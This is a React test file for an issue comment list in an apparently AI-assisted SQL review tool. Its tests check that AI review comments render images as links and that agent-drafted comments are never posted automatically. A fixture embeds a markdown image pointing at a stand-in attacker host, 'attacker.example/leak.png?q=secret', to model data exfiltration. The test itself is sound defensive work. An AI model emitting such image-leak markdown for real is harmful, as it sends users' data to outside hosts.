import { create } from "@bufbuild/protobuf";
import {
  cleanup,
  fireEvent,
  render,
  screen,
  waitFor,
} from "@testing-library/react";
import type { ReactNode } from "react";
import { afterEach, describe, expect, test, vi } from "vitest";
import {
  type IssueComment,
  IssueComment_ReviewMetadata_Priority,
  IssueCommentSchema,
  IssueSchema,
  ReviewRun_Type,
} from "@/types/proto-es/v1/issue_service_pb";
import { ReviewRuleType } from "@/types/proto-es/v1/review_rule_pb";
import {
  issueCommentDraftKey,
  prepareIssueCommentDraftRoute,
  wasIssueCommentDraftDelivered,
} from "@/lib/issueCommentDraft";

const ISSUE = "projects/p/issues/1";

const mocks = vi.hoisted(() => ({
  comments: [] as IssueComment[],
  project: undefined as { name: string } | undefined,
  query: {} as Record<string, string>,
  createIssueComment: vi.fn(async () => undefined),
  fetchIssueCommentTimeline: vi.fn(async () => undefined),
}));

vi.mock("react-i18next", () => ({
  initReactI18next: { type: "3rdParty", init: () => {} },
  useTranslation: () => ({ t: (key: string) => key }),
}));

vi.mock("@/components/HumanizeTs", async () => ({
  ...(await import("@/test-utils/humanizeTs")).humanizeTsStub(),
}));

vi.mock("@/api", () => ({ issueServiceClientConnect: {} }));

vi.mock("@/app/router", () => ({
  useCurrentRoute: () => ({ hash: "", query: mocks.query }),
}));

vi.mock("@/components/issue-activity/IssueCommentActivity", () => ({
  ActivityRowShell: ({
    body,
    header,
    icon,
  }: {
    body: ReactNode;
    header: ReactNode;
    icon: ReactNode;
  }) => (
    <li data-testid="review-row">
      {icon}
      <div data-testid="row-header">{header}</div>
      {body}
    </li>
  ),
  CommentCreator: () => null,
  CommentIconBadge: ({ icon }: { icon: ReactNode }) => icon,
  canEditIssueComment: () => false,
  IssueCommentRow: ({ body }: { body: ReactNode }) => (
    <li data-testid="comment-row">{body}</li>
  ),
}));

vi.mock("@/components/UserAvatar", () => ({ UserAvatar: () => null }));

vi.mock("@/hooks/useAppState", () => ({
  useCurrentUser: () => ({ email: "me@example.com", title: "Me" }),
}));

vi.mock("@/hooks/usePrincipal", () => ({
  principalLabel: () => "creator",
  usePrincipal: () => undefined,
}));

vi.mock("@/hooks/useProjectByName", () => ({
  useProjectByName: () => mocks.project,
}));

vi.mock("@/stores", () => ({ pushNotification: vi.fn() }));

vi.mock("@/stores/app", () => {
  const state = {
    batchGetOrFetchUsers: vi.fn(async () => undefined),
    fetchIssueCommentTimeline: mocks.fetchIssueCommentTimeline,
    getIssueComments: () => mocks.comments,
    projectsByName: {},
    createIssueComment: mocks.createIssueComment,
  };
  const useAppStore = (selector: (s: typeof state) => unknown) =>
    selector(state);
  useAppStore.getState = () => state;
  return { useAppStore };
});

vi.mock("@/utils/iam/permission", () => ({
  hasProjectPermissionV2: () => Boolean(mocks.project),
}));

vi.mock("../../plan-detail/components/PlanChangeReference", () => ({
  PlanSpecChangeReference: () => null,
}));

vi.mock("../../plan-detail/components/PlanTargetDisplay", () => ({
  PlanTargetDisplay: ({ target }: { target: string }) => <span>{target}</span>,
}));

vi.mock("../../plan-detail/hooks/usePlanChangeReferenceData", () => ({
  usePlanChangeReferenceData: () => ({}),
}));

vi.mock("../context/IssueDetailContext", () => ({
  useIssueDetailContext: () => ({
    issue: create(IssueSchema, { name: ISSUE }),
    patchState: vi.fn(),
    projectId: "p",
    setEditing: vi.fn(),
  }),
}));

import { IssueDetailCommentList } from "./IssueDetailCommentList";

const LEAK = "https://attacker.example/leak.png?q=secret";
const TEXT = `Drop risk\n\n![chart](${LEAK})`;

const comment = (name: string, reviewMetadata?: boolean) =>
  create(IssueCommentSchema, {
    name: `${ISSUE}/issueComments/${name}`,
    comment: TEXT,
    reviewMetadata: reviewMetadata
      ? {
          runType: ReviewRun_Type.AI,
          priority: IssueComment_ReviewMetadata_Priority.P1,
          targets: ["instances/i/databases/d"],
        }
      : undefined,
  });

afterEach(() => {
  cleanup();
  mocks.comments = [];
  mocks.project = undefined;
  mocks.query = {};
  mocks.createIssueComment.mockClear();
  mocks.fetchIssueCommentTimeline.mockClear();
  localStorage.clear();
  sessionStorage.clear();
});

describe("IssueDetailCommentList", () => {
  test("renders a review result without loading its images", () => {
    mocks.comments = [comment("result", true)];
    const { container } = render(<IssueDetailCommentList />);

    expect(screen.getByText("Drop risk")).toBeDefined();
    expect(container.querySelector("img")).toBeNull();
    expect(
      container.querySelector(`a[href="${LEAK}"]`)?.textContent
    ).toBe("chart");
  });

  test("heads a review result with its reviewer, priority, and targets", () => {
    mocks.comments = [comment("result", true)];
    render(<IssueDetailCommentList />);

    expect(screen.queryByTestId("comment-row")).toBeNull();
    const header = screen.getByTestId("row-header");
    expect(header.textContent).toContain("sql-review.ai-review.self");
    expect(screen.getByTestId("review-priority").textContent).toBe("P1");
    expect(screen.getByTestId("review-targets").textContent).toContain(
      "instances/i/databases/d"
    );
  });

  test("names the standard rule of a RULE result", () => {
    const rule = comment("rule", true);
    if (rule.reviewMetadata) {
      rule.reviewMetadata.runType = ReviewRun_Type.RULE;
      rule.reviewMetadata.ruleType = ReviewRuleType.REQUIRE_WHERE;
    }
    mocks.comments = [rule];
    render(<IssueDetailCommentList />);

    expect(screen.getByTestId("row-header").textContent).toContain(
      "sql-review.standard-rules.self"
    );
    expect(screen.getByTestId("review-rule").textContent).toContain(
      "sql-review.standard-rules.rule.require-where.title"
    );
  });

  test("renders a member's comment with its images, as before", () => {
    mocks.comments = [comment("member")];
    const { container } = render(<IssueDetailCommentList />);

    expect(screen.getByTestId("comment-row")).toBeDefined();
    expect(screen.queryByTestId("review-row")).toBeNull();
    expect(container.querySelector("img")?.getAttribute("src")).toBe(LEAK);
  });

  test("opens a prepared Agent comment in the Issue editor without posting it", () => {
    mocks.project = { name: "projects/p" };
    const route = prepareIssueCommentDraftRoute(
      ISSUE,
      "Please verify the security boundary."
    );
    mocks.query = route.query as Record<string, string>;

    render(<IssueDetailCommentList />);

    expect(screen.getByRole("textbox")).toHaveProperty(
      "value",
      "Please verify the security boundary."
    );
    expect(localStorage.getItem(issueCommentDraftKey(ISSUE))).toBe(
      "Please verify the security boundary."
    );
    expect(
      wasIssueCommentDraftDelivered(mocks.query.agentCommentDraft)
    ).toBe(true);
    expect(mocks.createIssueComment).not.toHaveBeenCalled();
  });

  test("keeps the prepared comment until an authorized editor can apply it", () => {
    const route = prepareIssueCommentDraftRoute(ISSUE, "Agent review");
    mocks.query = route.query as Record<string, string>;
    const key = mocks.query.agentCommentDraft;

    render(<IssueDetailCommentList />);

    expect(screen.queryByRole("textbox")).toBeNull();
    expect(localStorage.getItem(issueCommentDraftKey(ISSUE))).toBeNull();
    expect(sessionStorage.getItem(key)).not.toBeNull();
    expect(wasIssueCommentDraftDelivered(key)).toBe(false);
  });

  test("shows a prepared comment when local draft persistence fails", async () => {
    mocks.project = { name: "projects/p" };
    const route = prepareIssueCommentDraftRoute(ISSUE, "Agent review");
    mocks.query = route.query as Record<string, string>;
    const key = mocks.query.agentCommentDraft;
    const setItem = vi
      .spyOn(Storage.prototype, "setItem")
      .mockImplementation(() => {
        throw new Error("Storage unavailable");
      });
    try {
      render(<IssueDetailCommentList />);
      expect(screen.getByRole("textbox")).toHaveProperty(
        "value",
        "Agent review"
      );
      expect(sessionStorage.getItem(key)).not.toBeNull();
      expect(wasIssueCommentDraftDelivered(key)).toBe(true);
      fireEvent.click(screen.getByRole("button", { name: "common.comment" }));
      await waitFor(() => {
        expect(screen.getByRole("textbox")).toHaveProperty("value", "");
        expect(sessionStorage.getItem(key)).toBeNull();
      });
    } finally {
      setItem.mockRestore();
    }
  });

  test("persists manual edits so a later Agent handoff cannot overwrite them", () => {
    mocks.project = { name: "projects/p" };
    render(<IssueDetailCommentList />);

    fireEvent.change(screen.getByRole("textbox"), {
      target: { value: "My unfinished review" },
    });

    expect(localStorage.getItem(issueCommentDraftKey(ISSUE))).toBe(
      "My unfinished review"
    );
    expect(() => prepareIssueCommentDraftRoute(ISSUE, "Agent review")).toThrow();
    expect(mocks.createIssueComment).not.toHaveBeenCalled();
  });

  test("keeps ordinary commenting usable when draft storage is unavailable", () => {
    mocks.project = { name: "projects/p" };
    const getItem = vi
      .spyOn(Storage.prototype, "getItem")
      .mockImplementation(() => {
        throw new Error("Storage unavailable");
      });
    const setItem = vi
      .spyOn(Storage.prototype, "setItem")
      .mockImplementation(() => {
        throw new Error("Storage unavailable");
      });
    try {
      render(<IssueDetailCommentList />);
      fireEvent.change(screen.getByRole("textbox"), {
        target: { value: "My review" },
      });
      expect(screen.getByRole("textbox")).toHaveProperty("value", "My review");
    } finally {
      getItem.mockRestore();
      setItem.mockRestore();
    }
  });

  test("clears a posted comment and refreshes even when draft cleanup fails", async () => {
    mocks.project = { name: "projects/p" };
    render(<IssueDetailCommentList />);
    fireEvent.change(screen.getByRole("textbox"), {
      target: { value: "Posted review" },
    });
    const initialRefreshes = mocks.fetchIssueCommentTimeline.mock.calls.length;
    const removeItem = vi
      .spyOn(Storage.prototype, "removeItem")
      .mockImplementation(() => {
        throw new Error("Storage unavailable");
      });
    try {
      fireEvent.click(screen.getByRole("button", { name: "common.comment" }));
      await waitFor(() => {
        expect(mocks.createIssueComment).toHaveBeenCalledWith({
          issueName: ISSUE,
          comment: "Posted review",
        });
        expect(screen.getByRole("textbox")).toHaveProperty("value", "");
        expect(mocks.fetchIssueCommentTimeline.mock.calls.length).toBeGreaterThan(
          initialRefreshes
        );
      });
    } finally {
      removeItem.mockRestore();
    }
  });
});
